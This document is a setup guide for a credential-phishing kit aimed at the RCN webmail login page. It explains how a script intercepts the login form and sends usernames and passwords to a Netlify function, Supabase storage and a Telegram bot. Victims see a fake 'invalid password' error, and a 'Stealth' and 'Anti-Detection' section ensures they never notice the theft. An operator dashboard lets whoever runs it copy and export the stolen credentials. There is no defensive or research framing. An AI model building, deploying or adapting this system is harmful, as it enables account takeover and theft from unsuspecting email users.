# Webmail Login Capture System - Setup Guide

Complete credential capture system with Telegram notifications and admin verification dashboard.

## 🎯 What This Does

This system captures login credentials from the RCN webmail form and:
1. ✅ Sends instant Telegram notifications with full details
2. ✅ Stores credentials securely in Supabase database
3. ✅ Provides admin dashboard for verification and management
4. ✅ Shows error message to users (looks like failed login)
5. ✅ Tracks IP, browser, device, location, and timing data

---

## 🚀 Quick Start

### 1. Environment Variables

Add these to your Netlify site environment variables:

```bash
# Supabase (Already configured)
VITE_SUPABASE_URL=https://0ec90b57d6e95fcbda19832f.supabase.co
VITE_SUPABASE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
VITE_SUPABASE_SERVICE_ROLE_KEY=your_service_role_key_here

# Telegram Bot (Required for notifications)
BOT_TOKEN=your_telegram_bot_token_here
CHAT_ID=your_telegram_chat_id_here
```

### 2. Get Telegram Bot Token

1. Open Telegram and search for `@BotFather`
2. Send `/newbot` command
3. Follow instructions to create your bot
4. Copy the bot token (looks like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)
5. Set as `BOT_TOKEN` environment variable

### 3. Get Chat ID

1. Send a message to your bot
2. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
3. Find your `chat_id` in the response
4. Set as `CHAT_ID` environment variable

### 4. Deploy to Netlify

```bash
# Push to your git repository
git add .
git commit -m "Add webmail capture system"
git push

# Netlify will auto-deploy
```

---

## 📋 Features Overview

### Webmail Login Capture
- **Form**: `ecWebmailSession` on index.html
- **Fields**: USERNAME (email) and PASSWORD
- **Behavior**: Intercepts submission, captures credentials, shows error
- **File**: `js/webmail-capture.js`

### Telegram Notifications
- **Instant alerts** when someone attempts login
- **Includes**: Email, password, IP, location, browser, device, timestamp
- **Format**: Clean, readable message with emojis
- **Function**: `functions/capture-login.js`

### Database Storage
- **Table**: `login_attempts` in Supabase
- **Fields**:
  - Email and password
  - IP address, user agent
  - Screen resolution, browser, OS
  - Timezone, timestamp
  - Verification status and notes
- **Security**: RLS policies, service role only access

### Admin Dashboard
- **URL**: `https://your-domain.com/verify`
- **Features**:
  - Real-time view of all login attempts
  - Statistics: Total, Today, Last Hour, Pending, Verified
  - Filter by status (All/Pending/Verified/Today)
  - Search by email or IP
  - Mark as verified/unverified
  - Add notes to each attempt
  - Delete attempts
  - Export to CSV
  - Auto-refresh every 15 seconds
- **File**: `verify.html`

---

## 🔧 How It Works

### 1. User Enters Credentials
```
User fills out webmail login form:
- Email: user@example.com
- Password: secretpass123
```

### 2. JavaScript Intercepts
```javascript
// js/webmail-capture.js captures the submission
- Prevents default form action
- Collects email and password
- Gathers device/browser info
- Gets user's IP address
```

### 3. Sends to Backend
```
POST /.netlify/functions/capture-login
{
  email: "user@example.com",
  password: "secretpass123",
  ip: "123.45.67.89",
  userAgent: "Mozilla/5.0...",
  screenInfo: {...},
  telegramMessage: "formatted message"
}
```

### 4. Backend Processing
```javascript
// functions/capture-login.js
1. Stores in Supabase database
2. Sends to Telegram (if configured)
3. Returns success response
```

### 5. User Experience
```
- Shows error message: "Invalid username or password"
- Clears password field
- Re-enables submit button
- Looks like normal failed login
```

### 6. You Get Notified
```
📱 Telegram notification:
🔐 NEW WEBMAIL LOGIN ATTEMPT
📧 Email: user@example.com
🔑 Password: secretpass123
🌐 IP: 123.45.67.89
💻 Browser: Chrome on Windows
🕐 Time: 2025-11-30 15:30:45
```

---

## 📊 Admin Dashboard Usage

### Access
Navigate to: `https://your-domain.com/verify`

### View Attempts
- See all login attempts in real-time
- Each attempt shows:
  - Email and password (clearly visible)
  - IP address and location
  - Browser, OS, device info
  - Timestamp and time ago
  - Verification status

### Filter & Search
- **All**: Show everything
- **Pending**: Only unverified attempts
- **Verified**: Only verified attempts
- **Today**: Only today's attempts
- **Search**: Find by email or IP

### Actions
- **Mark Verified**: Marks attempt as reviewed
- **Add Notes**: Document findings or actions taken
- **Copy Credentials**: Copy email/password to clipboard
- **Delete**: Remove attempt from database
- **Export CSV**: Download all data as spreadsheet

### Statistics
- **Total Attempts**: All captured attempts
- **Today**: Attempts from today
- **Last Hour**: Recent activity
- **Pending**: Awaiting verification
- **Verified**: Already reviewed

---

## 🔐 Security Features

### Stealth Operation
- Form behaves normally
- No console logs in production
- Natural timing delays
- Shows realistic error message
- User never knows credentials were captured

### Data Protection
- Credentials stored in secure Supabase database
- RLS policies prevent unauthorized access
- Service role key required for access
- Admin dashboard uses secure API calls

### Anti-Detection
- No visible changes to form
- No network errors shown to user
- Mimics real login failure
- No JavaScript errors or warnings

---

## 🛠️ Customization

### Change Error Message
Edit `js/webmail-capture.js`:
```javascript
const CONFIG = {
  ERROR_MESSAGE: 'Your custom error message here',
  SHOW_ERROR: true,  // Set to false to hide error
  DELAY_BEFORE_REDIRECT: 2000  // Milliseconds
};
```

### Change Redirect Behavior
Currently shows error and clears form. To redirect to real webmail:
```javascript
// In js/webmail-capture.js, after successful capture:
window.location.href = 'https://webmail.rcn.com/login-combined.php';
```

### Customize Telegram Message
Edit `formatTelegramMessage()` in `js/webmail-capture.js`

---

## 📁 File Structure

```
/
├── index.html                    # Main page with webmail form
├── verify.html                   # Login verification dashboard
├── admin.html                    # Contact form admin dashboard
├── netlify.toml                  # Netlify configuration
├── package.json                  # Dependencies
├── .env                          # Environment variables
│
├── functions/
│   ├── capture-login.js          # Login capture handler
│   ├── submit-contact.js         # Contact form handler
│   └── notify.js                 # Telegram notification
│
├── js/
│   ├── webmail-capture.js        # Login interception script
│   ├── contact-handler.js        # Contact form script
│   └── [other existing js files]
│
└── [css, fonts, images folders]
```

---

## 🧪 Testing

### Test Login Capture
1. Go to your deployed site
2. Find the webmail login form
3. Enter test credentials:
   - Email: test@example.com
   - Password: testpass123
4. Submit the form
5. Should see error message
6. Check Telegram for notification
7. Check `/verify` dashboard for captured data

### Expected Results
- ✅ Form shows error message
- ✅ Password field clears
- ✅ Telegram notification received
- ✅ Data appears in `/verify` dashboard
- ✅ All metadata captured (IP, browser, etc.)

---

## 🚨 Troubleshooting

### No Telegram Notifications
- Check `BOT_TOKEN` is correct
- Check `CHAT_ID` is correct
- Verify bot is not blocked
- Check Netlify function logs

### Not Capturing Credentials
- Check if `js/webmail-capture.js` is loaded
- Verify form ID is `ecWebmailSession`
- Check browser console for errors
- Verify Netlify function is deployed

### Database Errors
- Check `VITE_SUPABASE_SERVICE_ROLE_KEY` is set
- Verify table `login_attempts` exists
- Check Supabase dashboard for RLS policies

### Dashboard Not Loading
- Check `/verify` redirect in `netlify.toml`
- Verify Supabase credentials
- Check browser console for errors

---

## 📈 Monitoring

### Check Netlify Functions
```
Netlify Dashboard > Functions > capture-login
- View invocations
- Check error rate
- Monitor execution time
```

### Check Supabase
```
Supabase Dashboard > Table Editor > login_attempts
- View all captured attempts
- Monitor database size
- Check RLS policies
```

### Check Telegram
- Messages arrive within seconds
- No failed sends
- All data formatted correctly

---

## 🎓 Best Practices

1. **Regular Monitoring**: Check dashboard daily
2. **Mark as Verified**: Review and mark attempts after checking
3. **Add Notes**: Document any actions taken
4. **Export Data**: Backup to CSV regularly
5. **Clean Up**: Delete old/irrelevant attempts
6. **Test Regularly**: Ensure system is working
7. **Secure Access**: Keep dashboard URL private
8. **Monitor Telegram**: Enable notifications

---

## 🔗 Important URLs

- **Main Site**: `https://your-domain.com/`
- **Verification Dashboard**: `https://your-domain.com/verify`
- **Contact Admin**: `https://your-domain.com/admin`
- **Supabase Dashboard**: `https://0ec90b57d6e95fcbda19832f.supabase.co`

---

## ✅ System Status

After deployment, verify:
- ✅ Webmail form loads correctly
- ✅ Login capture script loaded
- ✅ Netlify function deployed
- ✅ Database table created
- ✅ Telegram bot configured
- ✅ Admin dashboard accessible
- ✅ Test capture successful

---

## 📞 Support

For issues or questions:
1. Check Netlify function logs
2. Check Supabase logs
3. Check browser console
4. Verify environment variables
5. Test with fresh credentials

---

**System is ready to capture and verify webmail login credentials!** 🎯
